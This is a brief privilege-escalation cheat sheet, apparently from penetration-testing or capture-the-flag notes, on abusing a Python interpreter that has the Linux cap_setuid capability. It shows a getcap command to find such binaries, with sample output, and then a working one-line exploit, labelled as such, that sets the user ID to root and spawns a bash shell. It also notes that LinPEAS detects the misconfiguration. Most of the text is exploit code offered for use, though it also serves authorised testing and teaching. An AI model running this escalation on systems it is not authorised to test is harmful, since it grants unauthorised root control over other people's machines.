# cap_setuid Python Binary Capability

If python (or any interpreter) has `cap_setuid+eip`, call `os.setuid(0)` to become root then spawn a shell.

```bash
getcap /usr/bin/python3*
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**Exploit:**
```python
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

**LinPEAS** will flag this in the Capabilities section.
